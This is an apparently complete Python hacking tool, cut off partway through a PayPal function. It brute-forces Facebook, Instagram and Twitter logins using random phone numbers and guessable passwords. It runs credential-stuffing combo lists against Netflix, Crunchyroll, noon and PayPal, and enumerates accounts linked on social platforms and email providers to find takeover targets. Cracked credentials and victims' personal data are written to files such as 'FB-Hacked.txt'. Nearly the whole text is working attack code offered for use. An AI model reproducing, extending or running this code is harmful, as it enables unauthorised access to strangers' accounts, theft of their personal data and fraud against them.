try:
 import requests,mechanize,random,time,json,os,user_agent,threading
except ImportError:
 import os
 from os import system as whisper
 whisper('pip install requests')
 whisper('pip install mechanize')
 whisper('pip install user_agent')
 whisper('pip install threading')
from user_agent import generate_user_agent
from mechanize import Browser
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
Z = '\033[1;31m'
X = '\033[1;33m'
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;39m'
C = '\033[2;35m'
B = '\033[2;36m'
Y = '\033[1;34m'
PRNT = threading.Lock()
def vv1ck(*a, **b):
	with PRNT:
		print(*a, **b)
logo=(f"""{G} _    _ _     _                     
{G}| |  | | |   (_)                    
{G}| |  | | |__  _ ___ _ __   ___ _ __ 
{G}| |/\| | '_ \| / __| '_ \ / _ \ '__|
{G}\  /\  / | | | \__ \ |_) |  __/ |   
{G} \/  \/|_| |_|_|___/ .__/ \___|_|   
{G}                   | |              
{G}                   |_|              
{G}[F] FaceBook  : @Boy15.Beats
{G}[I] InstaGram : @BoyFtn
{G}[T] TeleGram  : @itzthedevil
{G}[G] GitHub    : @whisper-666
{G}[W] WhatsApp  : +213673336272
{E}====================================""")
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
def info(ft):
 fb_token=ft
 otw = requests.get('https://graph.facebook.com/me?access_token='+fb_token)
 a = json.loads(otw.text)
 fn = a['name']
 print(f'[√] FB Name ==> {fn}')
 if KeyError:
  pass
 id = a['id']
 print(f'[√] FaceBook ID ==> {id}')
 if KeyError:
  pass
  bd = a['birthday']
  print(f'[√] FB BirthDay ==> {bd}')
 if 'email' in a:
  em= a['email']
  print(f'[√] FB E-mail ==> {em}')
 if KeyError:
  pass
  gn= a['gender']
  print(f'[√] FB Gender ==> {gn}')
 if 'username' in a:
  ur= a['username']
  print(f'[√] FB UserName ==> {ur}')
 if KeyError:
  pass
def fbw():
 os.system('clear')
 print(logo)
 pswrd=input('[+] PassWord ==> ')
 cd=input('[+] Country Code [+213,+20...] ==> ')
 cn=input('[+] Number Code [66,12,77...] ==> ')
 rng=int(input('[+] Numbers After [7,8,6...] ==> '))
 print('====================================')
 while True:
  user='1234567890'
  whisper = str("".join(random.choice(user)for i in range(rng)))
  email= cd+cn+whisper
  password = pswrd
  data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email='+email+'&locale=en_US&password='+password+'&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  q = json.load(data)
  if 'access_token' in q:
   print(G+'[√] E-mail ==> '+email+'\n[√] PassWord ==> '+password)
   with open('FB-Hacked.txt', 'a') as (Hack):
    Hack.write('[+] E-mail : {} \n [-] Passowrd : {} \n\n'.format(email, password))
   ft=q['access_token']
   info(ft)
  elif 'www.facebook.com' in q['error_msg']:
   print(S+'[≈] E-mail ==> '+email+' | PassWord ==> '+password)
   with open('FB-checkpoint.txt', 'a') as (cp):
    cp.write('[+] UserName : {} \n [-] Passowrd : {} \n\n'.format(email, password))
  else:
   print(E+'[×] E-mail ==> '+email+' | PassWord ==> '+password)
def insta():
 import requests,sys,time,os,random,uuid,secrets
 from time import sleep
 from uuid import uuid4
 from secrets import token_hex
 uid = uuid.uuid4()
 cookie = secrets.token_hex(8) * 2
 os.system('clear')
 print(logo)
 cd=input('[+] Country Code [+213,+20...] ==> ')
 cn=input('[+] Number Code [66,12,77...] ==> ')
 rng=int(input('[+] Numbers After [7,8,6...] ==> '))
 print('====================================')
 user = '1234567890'
 while True:
    whisper = str("".join(random.choice(user)for i in range(rng)))
    username= cd+cn+whisper
    password = '0'+cn+whisper
    cookies = token_hex(8) * 2
    url='https://i.instagram.com/api/v1/accounts/login/'
    headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
              'Host':'i.instagram.com'}
    data = {'uuid':uid,  'password':password,
              'username':username,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
    req= requests.post(url, headers=headers, data=data)
    if 'logged_in_user' in req.json():
        userQ = req.json()['logged_in_user']['username']
        print(G+' UserName ==> '+userQ+' | PassWord ==> '+password)
        with open('Insta-Hacked.txt', 'a') as (Hack):
            Hack.write('[+] UserName : {} \n [-] Passowrd : {}\n'.format(userQ, password))
    if '"message":"challenge_required"' in req.text:
        with open('Insta-Secure.txt', 'a') as (SECURE):
            SECURE.write('[-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
            print(S+' E-mail : '+username+' | PassWord : '+password)
    if "'message': 'Please wait a few minutes before you try again.'" in req.json():
          print('Wait')
          sleep(30)
    else:
        print(E+' E-mail : '+username+' | PassWord : '+password)
def twitter():
 print(logo)
 cd=input('[+] Country Code [+213,+20...] ==> ')
 cn=input('[+] Number Code [66,12,77...] ==> ')
 rng=int(input('[+] Numbers After [7,8,6...] ==> '))
 print('====================================')
 while True:
  user='1234567890'
  whisper = str("".join(random.choice(user)for i in range(rng)))
  email = cd+cn+whisper
  password = '0'+cn+whisper
  r=requests.session()
  head={
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Encoding': 'gzip, deflate, br',
		'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
		'Content-Length': '901',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Cookie': 'personalization_id="v1_aFGvGiam7jnp1ks4ml5SUg=="; guest_id=v1%3A161776685629025416; gt=1379640315083112449; ct0=de4b75112a3f496676a1b2eb0c95ef65; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCIA8a6p4AToMY3NyZl9p%250AZCIlM2RlMDA1MzYyNmJiMGQwYzQ1OGU2MjFhODY5ZGU5N2Y6B2lkIiU4ODM0%250AMjM5OTNlYjg0ZGExNzRiYTEwMWE0M2ZhYTM0Mw%253D%253D--f5b0bce9df3870f1a221ae914e684fbdc533d03d; external_referer=padhuUp37zjgzgv1mFWxJ12Ozwit7owX|0|8e8t2xd8A2w%3D; _mb_tk=10908ac0975311eb868c135992f7d397',
		'Host': 'twitter.com',
		'Origin': 'https://twitter.com',
		'Referer': 'https://twitter.com/login?lang=ar',
		'TE': 'Trailers',
		'Upgrade-Insecure-Requests': '1',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0', }
  data={
		'redirect_after_login': '/',
		'remember_me': '1',
		'authenticity_token': '10908ac0975311eb868c135992f7d397',
		'wfa': '1',
		'ui_metrics': '{\"rf\":{\"ab4c9cdc2d5d097a5b2ccee53072aff6d2b5b13f71cef1a233ff378523d85df3\":1,\"a51091a0c1e2864360d289e822acd0aa011b3c4cabba8a9bb010341e5f31c2d2\":84,\"a8d0bb821f997487272cd2b3121307ff1e2e13576a153c3ba61aab86c3064650\":-1,\"aecae417e3f9939c1163cbe2bde001c0484c0aa326b8aa3d2143e3a5038a00f9\":84},\"s\":\"MwhiG0C4XblDIuWnq4rc5-Ua8dvIM0Z5pOdEjuEZhWsl90uNoC_UbskKKH7nds_Qdv8yCm9Np0hTMJEaLH8ngeOQc5G9TA0q__LH7_UyHq8ZpV2ZyoY7FLtB-1-Vcv6gKo40yLb4XslpzJwMsnkzFlB8YYFRhf6crKeuqMC-86h3xytWcTuX9Hvk7f5xBWleKfUBkUTzQTwfq4PFpzm2CCyVNWfs-dmsED7ofFV6fRZjsYoqYbvPn7XhWO1Ixf11Xn5njCWtMZOoOExZNkU-9CGJjW_ywDxzs6Q-VZdXGqqS7cjOzD5TdDhAbzCWScfhqXpFQKmWnxbdNEgQ871dhAAAAXiqazyE\"}',
		'session[username_or_email]': email,
		'session[password]': password}
  req=r.post(f'https://twitter.com/sessions',headers=head,data=data)
  if ("ct0") in req.cookies:
   print(f'{G}[√] Hacked ==> {email} | {password}')
   with open('Twitter-Hacked.txt', 'a') as (Hack):
     Hack.write('[+] UserName : {} \n [-] Passowrd : {}\n'.format(email, password))
  else:
   print(f'{E}[×] Wrong ==> {email} | {password}')
def netflix():
 print(logo)
 file=input('[+] Combo List Name : ')
 print('====================================')
 while True:
  for whis in open(file,'r').read().splitlines():
   whisper = str(whis)
   ema = whisper.split(':')[0]
   password = whisper.split(':')[1]
   email = ema.split("@")[0]
   domn = ema.split("@")[1]
   url = 'https://ios.prod.http1.netflix.com/iosui/user/10.19'
   headers = {
    "Host": "ios.prod.http1.netflix.com",
    "Cookie": "flwssn=74266376-523d-48c3-9bc3-8a009e804a37; memclid=TkZBUFBMLTAyLUlQSE9ORTk9NC1ENUJBN0IxQTAyNTI0NTM2OEQ0QUEzMjNFOTg3NDMzQzUyQzZGQjRCNjczRTg1NjIxRUEzMDFENDQ0RUM3OEIx; nfvdid=BQFmAAEBENN4QjtTnSS8VW_4WDVPc45gbv8HGuY3dcUdp9_6Xb6d_vcJbqU4lp2n8cm8kaOYxAGr7OI5JciXNkgH-zvKmtkUQcWfMkOj3TvuMtezrkns7ZtQcfAcFOutfzGV9LhYM1QKbizWrz0uHkFoHMVbhNYl",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Netflix.argo.abtests": "",
    "X-Netflix.client.appversion": "10.19.0",
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "ar-US;q=1, en-US;q=0.9",
    "Content-Length": "1851",
    "X-Netflix.client.idiom": "phone",
    "User-Agent": generate_user_agent(),
    "X-Netflix.client.type": "argo",
    "X-Netflix.nfnsm": "9",
    "Connection": "close"}
   data = f'appInternalVersion=10.19.0&appVersion=10.19.0&callPath=%5B%22moneyball%22%2C%22appleSignUp%22%2C%22next%22%5D&config=%7B%22useSecureImages%22%3Atrue%2C%22volatileBillboardEnabled%22%3A%22false%22%2C%22kidsTrailers%22%3Atrue%2C%22kidsBillboardEnabled%22%3A%22true%22%2C%22interactiveFeaturePIBEnabled%22%3A%22true%22%2C%22showMoreDirectors%22%3Atrue%2C%22roarEnabled%22%3A%22true%22%2C%22warmerHasGenres%22%3Atrue%2C%22aroGalleriesEnabled%22%3A%22false%22%2C%22verticalBillboardEnabled%22%3A%22true%22%2C%22previewsRowEnabled%22%3A%22true%22%2C%22contentRefreshEnabled%22%3A%22false%22%2C%22interactiveFeatureStretchBreakoutEnabled%22%3A%22true%22%2C%22interactiveFeatureBuddyEnabled%22%3A%22true%22%2C%22interactiveFeatureAlexaAndKatieCharacterEnabled%22%3A%229.57.0%22%2C%22titleCapabilityFlattenedShowEnabled%22%3A%22true%22%2C%22kidsMyListEnabled%22%3A%22true%22%2C%22billboardEnabled%22%3A%22true%22%2C%22interactiveFeatureBadgeIconTestEnabled%22%3A%229.57.0%22%2C%22shortformRowEnabled%22%3A%22false%22%2C%22kidsUIOnPhone%22%3Afalse%2C%22contentWarningEnabled%22%3A%22true%22%2C%22billboardPredictionEnabled%22%3A%22false%22%2C%22billboardKidsTrailerEnabled%22%3A%22false%22%2C%22billboardTrailerEnabled%22%3A%22false%22%2C%22bigRowEnabled%22%3A%22true%22%7D&device_type=NFAPPL-02-&esn=NFAPPL-02-IPHONE9%3D4-D5BA7B1A025245368D4AA323E987433C52C6FB4B673E85621EA301D444EC78B1&idiom=phone&iosVersion=14.3&isTablet=false&kids=false&maxDeviceWidth=414&method=call&model=saget&modelType=IPHONE9-4&odpAware=true&param=%7B%22action%22%3A%22loginAction%22%2C%22fields%22%3A%7B%22email%22%3A%22{email}%40{domn}%22%2C%22rememberMe%22%3A%22true%22%2C%22password%22%3A%22{password}%22%7D%2C%22verb%22%3A%22POST%22%2C%22mode%22%3A%22login%22%2C%22flow%22%3A%22appleSignUp%22%7D&pathFormat=graph&pixelDensity=3.0&progressive=false&responseFormat=json'
   Go = r.post(url, headers=headers, data=data, proxies=None)
   if '"memberHome"' in Go.text:
    print(f'{G}Hacked Netflix ==> {ema} | {password}')
   elif '"incorrect_password"' in Go.text:
    print(f'{E}Wrong PassWord ==> {ema} | {password}')
   elif 'never_member_consumption_only' in Go.text:
    print(f'{S}Free Netflix ==> {ema} | {password}')
   elif 'unrecognized_email' in Go.text:
    print(f'{E}Wrong E-mail ==> {ema} | {password}')
   else:
    print(f'{E}You Are Blocked ==>{S} Use VPN Or Wait 1h')
    time.sleep(3600)
def code_whisper_mailru(email,mod):
 headers_6 = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
 url = 'https://account.mail.ru/api/v1/user/exists'
 data_6 = {'email': email}
 js = requests.post(url, data=data_6, headers=headers_6)
 if str(js.json()['body']['exists']) == 'False':
     print(f"{G} Hacked {mod} and Mail.ru ==> "+G+email)
     with open('Mailru.txt', 'a') as J:J.write(email+'\n')
 else:
     print(S+" Not Hacked Mail.ru => "+email)
def code_whisper_hotmail(email,mod):
 url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + email + "&_=1604288577990"
 data = ''
 headers = {
		"Accept": "*/*",
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
		"Connection": "close",
		"Host": "odc.officeapps.live.com",
		"Accept-Encoding": "gzip, deflate",
		"Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
		"Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
		"canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
		"uaid": "d06e1498e7ed4def9078bd46883f187b",
		"Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}	
 html = requests.get(url, data=data, headers=headers).text
 if 'Neither' in html:
     print(f"{G} Hacked {mod} and HotMail ==> "+G+email)
     with open('Hotmail.txt', 'a') as J:J.write(email+'\n')
 else:
     print(S+" Not Hacked HotMail => "+email)
def code_whisper_outlook(email,mod):
 url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + email + "&_=1604288577990"
 data = ''
 headers = {
		"Accept": "*/*",
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
		"Connection": "close",
		"Host": "odc.officeapps.live.com",
		"Accept-Encoding": "gzip, deflate",
		"Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
		"Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
		"canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
		"uaid": "d06e1498e7ed4def9078bd46883f187b",
		"Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}	
 html = requests.get(url, data=data, headers=headers).text
 if 'Neither' in html:
     print(f"{G} Hacked {mod} and OutLook ==> "+G+email)
     with open('Outlook.txt', 'a') as J:J.write(email+'\n')
 else:
     print(S+" Not Hacked OutLook => "+email)
def code_whisper_yahoo(email,mod):
    br = mechanize.Browser()
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    br.addheaders = [('User-agent', 'Mozila')]
    login = 'https://login.yahoo.com/?display=narrow&.intl=xa&.lang=ar-JO&.src=fpctx&done=https%3A%2F%2Fmaktoob.yahoo.com%2F&prefill=0&chllngnm=base'
    br.open(login)
    br.select_form(nr=0)
    br.form['username'] = email
    sub = br.submit()
    urlY = sub.geturl()
    if urlY == login:
        print(f"{G} Hacked {mod} and yahoo ==> "+G+email)
        with open('Yahoo.txt', 'a') as J:J.write(email+'\n')
        pass
    else:
        print(S+" Not Hacked yahoo => "+email)
        
def code_whisper_gmail(email,mod):
	url = 'https://android.clients.google.com/setup/checkavail'
	h = {
		'Content-Length':'98',
		'Content-Type':'text/plain; charset=UTF-8',
		'Host':'android.clients.google.com',
		'Connection':'Keep-Alive',
		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
		}
	d = json.dumps({
		'username':email,
		'version':'3',
		'firstName':'AbaLahb',
		'lastName':'AbuJahl'
	})
	res = requests.post(url,data=d,headers=h)
	if res.json()['status'] == 'SUCCESS':
	    print(f"{G} Hacked {mod} and Gmail ==> "+G+email)
	    with open('Gmail.txt', 'a') as J:J.write(email+'\n')
	if res.json()['status'] == 'USERNAME_UNAVAILABLE':
	    print (S+' Not Hacked Gmail ==> '+email)
def facebook():
                   os.system('clear')
                   print(logo)
                   def PrintTF(email):
                     print(f"{G}FaceBook = {email} = Linked")
                   def PrintFF(email):
                     print(f"{E}FaceBook = {email} = Unlinked")
                   file=input('[+] E-mail List Name ==> ')
                   print('====================================')
                   for Whisper in open(file,'r').read().splitlines():
                    mod='FaceBook'
                    email=str(Whisper.split('\n')[0])
                    br = mechanize.Browser()
                    br.set_handle_robots(False)
                    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
                    br.addheaders = [('User-agent', generate_user_agent())]
                    br.open("https://mbasic.facebook.com/login/identify/?ctx=recover&search_attempts=0&ars=facebook_login&alternate_search=0&toggle_search_mode=1")
                    br._factory.is_html= True
                    br.select_form(nr=0)
                    br.form["email"] = email
                    br.submit()
                    urb = br.geturl()
                    #print(urb)
                    if "https://mbasic.facebook.com/login/identify/?ctx=recover&search_attempts=1&ars=facebook_login&alternate_search=1" in urb:
                        PrintFF(email)
                    if "https://mbasic.facebook.com/login/identify/?ctx=recover&c=%2Flogin%2F&search_attempts=1&ars=facebook_login&alternate_search=1&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0" in urb:
                        PrintFF(email)
                        pass
                    else:
                        PrintTF(email)
                        #print(urb)
                        if '@gmail.com' in str(email):
                            code_whisper_gmail(email,mod)
                        if '@yahoo.com' in str(email):
                            code_whisper_yahoo(email,mod)
                        if '@hotmail.com' in str(email):
                            code_whisper_hotmail(email,mod)
                        if '@outlook.com' in str(email):
                            code_whisper_outlook(email,mod)
                        if '@mail.ru' in str(email):
                            code_whisper_mailru(email,mod)
def instagram():
      import time,requests
      os.system('clear')
      print(logo)
      file=input('[+] E-mail List Name ==> ')
      print('====================================')
      for Whisper in open(file,'r').read().splitlines():
        mod='InstaGram'
        email=str(Whisper.split('\n')[0])
        def PrintTI(email):
         print(f"{G}InstaGram = {email} = Linked")
        def PrintFI(email):
         print(f"{E}InstaGram = {email} = Unlinked")
        url = 'https://www.instagram.com/accounts/login/ajax/'
        heade = {
'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en,ar;q=0.9,en-US;q=0.8,vi;q=0.7',
'content-length': '313',
'content-type': 'application/x-www-form-urlencoded',
'cookie': 'missing',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/',
'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Microsoft Edge";v="92"',
'sec-ch-ua-mobile': '?0',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Edg/92.0.902.84',
'x-asbd-id': '198387',
'x-csrftoken': 'HpoO4isqbCMK5a6fl9CRofLsuxpwGavJ',
'x-ig-app-id': '936619743392459',
'x-ig-www-claim': 'hmac.AR2_82ibn8D_4DzDUg2jml85Kj9ruPEQVg0mDDRCksQ3pOav',
'x-instagram-ajax': 'd26a8ffbcd2b',
'x-requested-with': 'XMLHttpRequest',
}
        tim = str(time.time()).split('.')[1]
        data = {
'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:diwddeoded',
'username': email,
'queryParams': '{}',
'optIntoOneTap': 'false',
'trustedDeviceRecords': '{}',
}
        ree = requests.post(url, headers=heade, data=data).text
        if '"user":true,"' in ree:
                        PrintTI(email)
                        if '@gmail.com' in str(email):
                            code_whisper_gmail(email,mod)
                        if '@yahoo.com' in str(email):
                            code_whisper_yahoo(email,mod)
                        if '@hotmail.com' in str(email):
                            code_whisper_hotmail(email,mod)
                        if '@outlook.com' in str(email):
                            code_whisper_outlook(email,mod)
                        if '@mail.ru' in str(email):
                            code_whisper_mailru(email,mod)
        else:
            PrintFI(email)
def twiter():
      os.system('clear')
      print(logo)
      file=input('[+] E-mail List Name ==> ')
      print('====================================')
      for Whisper in open(file,'r').read().splitlines():
        email=str(Whisper.split('\n')[0])
        def PrintTT(email):
         print(f"{G}Twitter = {email} = Linked")
        def PrintFT(email):
         print(f"{E}Twitter = {email} = Unlinked")
        mod='Twitter'
        r = requests.Session()
        url = "https://api.twitter.com/i/users/email_available.json?email="+email
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36"
        Host = "api.twitter.com"
        Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
        r.headers = {'User-Agent': user_agent}
        r.headers = {'Host': Host}
        r.headers = {'Accept': Accept}
        req = r.get(url).json()
        text = str(req)
        if text.find("'valid': False") == True:
                        PrintTT(email) 
                        if '@gmail.com' in str(email):
                            code_whisper_gmail(email,mod)
                        if '@yahoo.com' in str(email):
                            code_whisper_yahoo(email,mod)
                        if '@hotmail.com' in str(email):
                            code_whisper_hotmail(email,mod)
                        if '@outlook.com' in str(email):
                            code_whisper_outlook(email,mod)
                        if '@mail.ru' in str(email):
                            code_whisper_mailru(email,mod)
        else:
            PrintFT(email)
def snapchat():
      os.system('clear')
      print(logo)
      file=input('[+] E-mail List Name ==> ')
      print('====================================')
      for Whisper in open(file,'r').read().splitlines():
        email=str(Whisper.split('\n')[0])
        def PrintTS(email):
         print(f"{G}SnapChat = {email} = Linked")
        def PrintFS(email):
         print(f"{E}SnapChat = {email} = Unlinked")
        mod='SnapChat'
        r = requests.Session()
        url = "https://accounts.snapchat.com/accounts/merlin/login"
        r.headers = {
        'Host': 'accounts.snapchat.com',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip, deflate, br',
        'X-XSRF-TOKEN': 'missing',
        'Content-Type': 'application/json',
        'Origin': 'https://accounts.snapchat.com',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
        'Connection':'keep-alive',
        'Referer': 'https://accounts.snapchat.com/accounts/merlin/login'
        }
        cookies = {
        'xsrf_token':'missing'
        }
        data = {
        'email':email,
        'app':'BITMOJI_APP'
        }
        req = r.post(url, cookies=cookies, json=data)
        if req.text.find("hasSnapchat") >= 0 :
                        PrintTS(email)
                        if '@gmail.com' in str(email):
                            code_whisper_gmail(email,mod)
                        if '@yahoo.com' in str(email):
                            code_whisper_yahoo(email,mod)
                        if '@hotmail.com' in str(email):
                            code_whisper_hotmail(email,mod)
                        if '@outlook.com' in str(email):
                            code_whisper_outlook(email,mod)
                        if '@mail.ru' in str(email):
                            code_whisper_mailru(email,mod)
        else:
            PrintFS(email)
def crunchyroll():
 os.system('clear')
 print(logo)
 file=input('[+] Combo List Name : ')
 print('====================================')
 while True:
  for i in open(file,"r").read().splitlines():
   password=i.split(":")[1]
   email=i.split(":")[0]
   wurl = 'https://beta-api.crunchyroll.com/auth/v1/token'
   whead = {'Host': 'beta-api.crunchyroll.com','Content-Type': 'application/x-www-form-urlencoded; charset=utf-8','Content-Length': '72','Accept': '*/*','Cookie': '__cf_bm=e5139fd59755316a1d33207946e491eedca399d4-1622012072-1800-AXtJ1LgqzVNJZK3q5xqlwl/WszKCJLs42G5q/2Eol1mjpzqNk1vMvaNLTGLhSdox4RZOxCMM3j6m+7AgqcL21rJzugUjmo3ZHo+xht26QxhF','Connection': 'keep-alive','ETP-Anonymous-ID': '4CDCA8EE-660B-4820-86AC-65CC26A2834B','User-Agent': generate_user_agent(),'Accept-Language': 'ar-SA;q=1.0','Authorization': 'Basic M2V2eDJudnF1ZTB1eG5wemJ2aG86NGZMUWRmQmVJdk1yNlVPei1Fb1N3aXZ0cmZ6Ym9HOFU=','Accept-Encoding': 'gzip;q=1.0, compress;q=0.5'}
   wdata = {'grant_type': 'password','password': password,'scope': 'offline_access','username': email}
   req=requests.post(wurl,headers=whead,data=wdata)
   if 'refresh_token' in req.text:
    print(f'{G}Hacked ==> {email} | {password}')
    with open('CrunchyRoll-Hacked.txt', 'a') as x:
     x.write(email+":"+password+'\n')
   elif 'force_password_reset' in req.text:
    print(f'{E}Wrong ==> {email} | {password}')
   elif 'invalid_credentials' in req.text:
    print(f'{E}Wrong ==> {email} | {password}')
   elif 'too_many_requests' in req.text:
    print(f'{E}Blocked ==> {email} | {password}')
   elif '406 Not Acceptable' in req.text:
    print(f'{S}Wait 5min')
   elif 'Attention Required!' in req.text:
    print(f'{E}Blocked ==> {email} | {password}')
   else:
    print(req.text)
    print(f'{E}ERROR ==> {email} | {password}')
def noon():
   os.system('clear')
   print(logo)
   file=input('[+] Combo List Name : ')
   print('====================================')
   while True:
    for i in open(file,"r").read().splitlines():
      pess=i.split(":")[1]
      email=i.split(":")[0]
      head={
                'Host': 'api-app.noon.com',
                'Cookie': 'missing',
                'Content-Type': 'application/json',
                'X-Experience': 'ecom',
                'X-Locale': 'ar-sa',
                'Accept': 'application/json, text/plain, */*',
                'X-Mp': 'noon',
                'Accept-Language': 'en-us',
                'Cache-Control': 'no-cache',
                'X-Content': 'mobile',
                'Content-Length': '52',
                'User-Agent': 'noon/1000 CFNetwork/1237 Darwin/20.4.0',
                'X-Device-Id': '9149EBD3-33DE-4568-918B-0469ECAA6453',
                'X-Platform': 'ios',
                'X-Build': '1000',
                'Connection': 'close'}
      data={"email":email,"password": pess}		
      req1=requests.post("https://api-app.noon.com/_svc/customer-v1/auth/signin",headers=head,json=data)
      if req1.status_code==200:
       print(f'[+] Hacked [{email}:{pess}]')
       phone=req1.json()['data']['phone']
       lN=req1.json()['data']['lastName']
       lc=req1.json()['data']['languageCode']
       jD=req1.json()['data']['joinDate']
       ia=req1.json()['data']['id']
       gr=req1.json()['data']['gender']
       fnm=req1.json()['data']['firstName']
       coc=req1.json()['data']['countryCode']
       sKey=req1.json()['data']['subscriptionKey']
       with open('acc_Done.txt', 'a') as x:
        acc=f'Phone Num:[{phone}]\nLast Name:[{lN}]\nlanguage:[{lc}]\nJoin Date:[{jD}]\nID:[{ia}]\nGender:[{gr}]\nFirst Name:[{fnm}]\nEmail:[{email}]\nPassword:[{pess}]\nCountry Code:[{coc}]\nSubscription Key:[{sKey}]'
        x.write(acc)
       print(acc)
      else:
       print(f'{E}[×] Wrong ==> {email}:{pess}')
def paypal():
 error = "راجع معلوماتك وأعد المحاولة.";SCOR = "لحمايتك، قمنا بإقفال حسابك مؤقتاً.";log1='firstPartyUserAccessToken';log2='phones'
 r=requests.session()
 os.system('clear')
 print(logo)
 file=input('[+] Combo List Name : ')
 print('====================================')
 while True:
   for i in open(file,"r").read().splitlines():
    pess=i.split(":")[1]
    eml=i.split(":")[0]
    headers={
'Host': 'api-m.paypal.com',
'Content-Type': 'application/x-www-form-urlencoded',
'Paypal-Client-Metadata-Id': '7e414acd7909416db4ddc61f36ac689e',
'Accept': 'application/json',
